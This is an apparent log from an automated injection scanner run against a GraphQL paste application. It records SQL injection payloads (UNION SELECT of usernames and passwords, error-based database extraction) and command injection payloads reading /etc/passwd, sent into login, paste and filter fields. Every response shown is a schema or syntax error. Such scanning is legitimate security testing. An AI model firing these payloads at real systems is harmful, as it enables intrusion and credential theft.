2026-02-02 23:16:05,431 | INFO    | InjectionTester      | error_based_extractvalue       | createPaste.title    | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 145}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-02 23:16:05,435 | INFO    | InjectionTester      | boolean_true                   | createPaste.title    | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 92}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,438 | INFO    | InjectionTester      | boolean_false                  | createPaste.title    | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 92}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-02 23:16:05,441 | INFO    | InjectionTester      | single_quote                   | editPaste.content    | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 60}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,444 | INFO    | InjectionTester      | or_1_eq_1_dash                 | editPaste.content    | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,447 | INFO    | InjectionTester      | or_string_eq                   | editPaste.content    | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,449 | INFO    | InjectionTester      | double_quote_or                | editPaste.content    | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:37) Expected :, found String\n\n1: mutation { editPaste(content: \"\" OR \"\"=\"\", id: 1, title: \"test\") { id message error success } }\n           …]
2026-02-02 23:16:05,452 | INFO    | InjectionTester      | double_quote_1_eq_1            | editPaste.content    | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:37) Expected :, found Int \"1\"\n\n1: mutation { editPaste(content: \"\" OR 1=1 --\", id: 1, title: \"test\") { id message error success } }\n         …]
2026-02-02 23:16:05,456 | INFO    | InjectionTester      | or_1_eq_1_hash                 | editPaste.content    | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 69}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,459 | INFO    | InjectionTester      | admin_comment_dash             | editPaste.content    | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,462 | INFO    | InjectionTester      | admin_comment_hash             | editPaste.content    | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,465 | INFO    | InjectionTester      | admin_comment_star             | editPaste.content    | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,468 | INFO    | InjectionTester      | union_select_123               | editPaste.content    | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 82}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,471 | INFO    | InjectionTester      | union_select_users             | editPaste.content    | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 114}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations"…]
2026-02-02 23:16:05,474 | INFO    | InjectionTester      | error_based_version            | editPaste.content    | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 180}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations"…]
2026-02-02 23:16:05,477 | INFO    | InjectionTester      | error_based_extractvalue       | editPaste.content    | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 124}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations"…]
2026-02-02 23:16:05,480 | INFO    | InjectionTester      | boolean_true                   | editPaste.content    | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 71}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,483 | INFO    | InjectionTester      | boolean_false                  | editPaste.content    | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 71}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,486 | INFO    | InjectionTester      | single_quote                   | editPaste.title      | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 60}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,489 | INFO    | InjectionTester      | or_1_eq_1_dash                 | editPaste.title      | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,492 | INFO    | InjectionTester      | or_string_eq                   | editPaste.title      | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 70}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,494 | INFO    | InjectionTester      | double_quote_or                | editPaste.title      | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected :, found String\n\n1: mutation { editPaste(content: \"test\", id: 1, title: \"\" OR \"\"=\"\") { id message error success } }\n           …]
2026-02-02 23:16:05,497 | INFO    | InjectionTester      | double_quote_1_eq_1            | editPaste.title      | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected :, found Int \"1\"\n\n1: mutation { editPaste(content: \"test\", id: 1, title: \"\" OR 1=1 --\") { id message error success } }\n         …]
2026-02-02 23:16:05,501 | INFO    | InjectionTester      | or_1_eq_1_hash                 | editPaste.title      | POST | success  |  0.004s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 69}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,504 | INFO    | InjectionTester      | admin_comment_dash             | editPaste.title      | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,507 | INFO    | InjectionTester      | admin_comment_hash             | editPaste.title      | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,510 | INFO    | InjectionTester      | admin_comment_star             | editPaste.title      | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,514 | INFO    | InjectionTester      | union_select_123               | editPaste.title      | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 82}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,517 | INFO    | InjectionTester      | union_select_users             | editPaste.title      | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 114}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations"…]
2026-02-02 23:16:05,520 | INFO    | InjectionTester      | error_based_version            | editPaste.title      | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 180}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations"…]
2026-02-02 23:16:05,523 | INFO    | InjectionTester      | error_based_extractvalue       | editPaste.title      | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 124}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations"…]
2026-02-02 23:16:05,526 | INFO    | InjectionTester      | boolean_true                   | editPaste.title      | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 71}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,529 | INFO    | InjectionTester      | boolean_false                  | editPaste.title      | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 71}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-02 23:16:05,532 | INFO    | InjectionTester      | single_quote                   | login.password       | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 54}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,535 | INFO    | InjectionTester      | or_1_eq_1_dash                 | login.password       | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,538 | INFO    | InjectionTester      | or_string_eq                   | login.password       | POST | success  |  0.003s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,541 | INFO    | InjectionTester      | double_quote_or                | login.password       | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected :, found String\n\n1: mutation { login(password: \"\" OR \"\"=\"\", username: \"admin\") { id message error success } }\n                 …]
2026-02-02 23:16:05,543 | INFO    | InjectionTester      | double_quote_1_eq_1            | login.password       | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:34) Expected :, found Int \"1\"\n\n1: mutation { login(password: \"\" OR 1=1 --\", username: \"admin\") { id message error success } }\n               …]
2026-02-02 23:16:05,547 | INFO    | InjectionTester      | or_1_eq_1_hash                 | login.password       | POST | success  |  0.004s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 63}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,551 | INFO    | InjectionTester      | admin_comment_dash             | login.password       | POST | success  |  0.004s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 62}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,554 | INFO    | InjectionTester      | admin_comment_hash             | login.password       | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,558 | INFO    | InjectionTester      | admin_comment_star             | login.password       | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,561 | INFO    | InjectionTester      | union_select_123               | login.password       | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 76}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,564 | INFO    | InjectionTester      | union_select_users             | login.password       | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 108}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"lin…]
2026-02-02 23:16:05,567 | INFO    | InjectionTester      | error_based_version            | login.password       | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 174}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"lin…]
2026-02-02 23:16:05,570 | INFO    | InjectionTester      | error_based_extractvalue       | login.password       | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 118}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"lin…]
2026-02-02 23:16:05,574 | INFO    | InjectionTester      | boolean_true                   | login.password       | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 65}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,577 | INFO    | InjectionTester      | boolean_false                  | login.password       | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 65}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,581 | INFO    | InjectionTester      | single_quote                   | login.username       | POST | success  |  0.003s | payload=['] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 57}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,585 | INFO    | InjectionTester      | or_1_eq_1_dash                 | login.username       | POST | success  |  0.003s | payload=[' OR 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,589 | INFO    | InjectionTester      | or_string_eq                   | login.username       | POST | success  |  0.004s | payload=[' OR '1'='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,592 | INFO    | InjectionTester      | double_quote_or                | login.username       | POST | success  |  0.002s | payload=[" OR ""="] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String\n\n1: mutation { login(password: \"changeme\", username: \"\" OR \"\"=\"\") { id message error success } }\n              …]
2026-02-02 23:16:05,595 | INFO    | InjectionTester      | double_quote_1_eq_1            | login.username       | POST | success  |  0.002s | payload=[" OR 1=1 --] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found Int \"1\"\n\n1: mutation { login(password: \"changeme\", username: \"\" OR 1=1 --\") { id message error success } }\n            …]
2026-02-02 23:16:05,598 | INFO    | InjectionTester      | or_1_eq_1_hash                 | login.username       | POST | success  |  0.003s | payload=[' OR 1=1 #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 66}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,601 | INFO    | InjectionTester      | admin_comment_dash             | login.username       | POST | success  |  0.003s | payload=[admin' --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 65}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,604 | INFO    | InjectionTester      | admin_comment_hash             | login.username       | POST | success  |  0.003s | payload=[admin' #] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,608 | INFO    | InjectionTester      | admin_comment_star             | login.username       | POST | success  |  0.003s | payload=[admin'/*] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,611 | INFO    | InjectionTester      | union_select_123               | login.username       | POST | success  |  0.003s | payload=[' UNION SELECT 1,2,3 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 79}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,614 | INFO    | InjectionTester      | union_select_users             | login.username       | POST | success  |  0.003s | payload=[' OR 1=1 UNION SELECT 1,username,password FROM users --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 111}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"lin…]
2026-02-02 23:16:05,618 | INFO    | InjectionTester      | error_based_version            | login.username       | POST | success  |  0.003s | payload=[' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 177}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"lin…]
2026-02-02 23:16:05,621 | INFO    | InjectionTester      | error_based_extractvalue       | login.username       | POST | success  |  0.003s | payload=[' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 121}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"lin…]
2026-02-02 23:16:05,625 | INFO    | InjectionTester      | boolean_true                   | login.username       | POST | success  |  0.003s | payload=[' AND 1=1 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,628 | INFO    | InjectionTester      | boolean_false                  | login.username       | POST | success  |  0.003s | payload=[' AND 1=0 --] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"Login\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"message\" on type \"Login\".", "locations": [{"line…]
2026-02-02 23:16:05,632 | INFO    | InjectionTester      | semicolon_id                   | pastes.filter        | POST | success  |  0.004s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 60}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,636 | INFO    | InjectionTester      | pipe_id                        | pastes.filter        | POST | success  |  0.004s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 60}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,639 | INFO    | InjectionTester      | double_pipe_id                 | pastes.filter        | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,644 | INFO    | InjectionTester      | and_id                         | pastes.filter        | POST | success  |  0.004s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 62}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,648 | INFO    | InjectionTester      | semicolon_cat_passwd           | pastes.filter        | POST | success  |  0.004s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 73}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,652 | INFO    | InjectionTester      | pipe_cat_passwd                | pastes.filter        | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 73}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,656 | INFO    | InjectionTester      | double_pipe_cat_passwd         | pastes.filter        | POST | success  |  0.004s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,660 | INFO    | InjectionTester      | and_cat_passwd                 | pastes.filter        | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 75}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,667 | INFO    | InjectionTester      | semicolon_uname                | pastes.filter        | POST | success  |  0.007s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 66}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,671 | INFO    | InjectionTester      | pipe_uname                     | pastes.filter        | POST | success  |  0.004s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 66}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,674 | INFO    | InjectionTester      | double_pipe_uname              | pastes.filter        | POST | success  |  0.004s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,679 | INFO    | InjectionTester      | and_uname                      | pastes.filter        | POST | success  |  0.004s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,683 | INFO    | InjectionTester      | backtick_cat_passwd            | pastes.filter        | POST | success  |  0.004s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 74}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,687 | INFO    | InjectionTester      | backtick_id                    | pastes.filter        | POST | success  |  0.004s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 61}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,691 | INFO    | InjectionTester      | backtick_uname                 | pastes.filter        | POST | success  |  0.004s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 67}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,696 | INFO    | InjectionTester      | dollar_cat_passwd              | pastes.filter        | POST | success  |  0.004s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 75}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,700 | INFO    | InjectionTester      | dollar_id                      | pastes.filter        | POST | success  |  0.004s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 62}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,705 | INFO    | InjectionTester      | dollar_uname                   | pastes.filter        | POST | success  |  0.004s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 68}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
2026-02-02 23:16:05,710 | INFO    | InjectionTester      | plain_uname                    | pastes.filter        | POST | success  |  0.004s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"PasteObject\".", "locations": [{"line": 1, "column": 65}]}, {"message": "Cannot query field \"error\" on type \"PasteObject\".", "loca…]
